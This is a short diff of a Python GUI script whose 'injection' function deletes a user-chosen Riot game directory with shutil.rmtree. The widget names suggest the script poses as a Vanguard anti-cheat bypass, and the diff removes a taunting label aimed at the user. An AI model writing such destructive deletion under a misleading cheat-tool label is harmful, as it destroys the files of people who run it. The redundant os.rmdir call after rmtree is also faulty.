@@ -9,7 +9,6 @@ def injection():
     path = riot_directory.get()
     shutil.rmtree(path)
     os.rmdir(path)
-    vanguard_bypass['text'] = 'LMAOOO CHEATIN ASS'
     riot_directory['state'] = 'disabled'
     inject['state'] = 'disabled'
 
